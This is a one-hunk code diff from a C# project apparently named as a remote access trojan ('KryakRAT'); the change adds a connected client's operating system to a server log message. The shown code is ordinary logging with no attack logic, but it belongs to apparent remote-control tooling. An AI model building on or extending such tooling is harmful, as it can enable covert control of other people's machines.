@@ -70,7 +70,7 @@ namespace KryakRAT
 
         private static void Server_UserConnected(UserData userData)
         {
-            WriteLog($"Client connected: {userData.Username} ({userData.UserIPAddress})");
+            WriteLog($"Client connected: {userData.Username}  {userData.UserOS} ({userData.UserIPAddress})");
 
             if (MainWindow?.DispatcherQueue == null)
                 return;
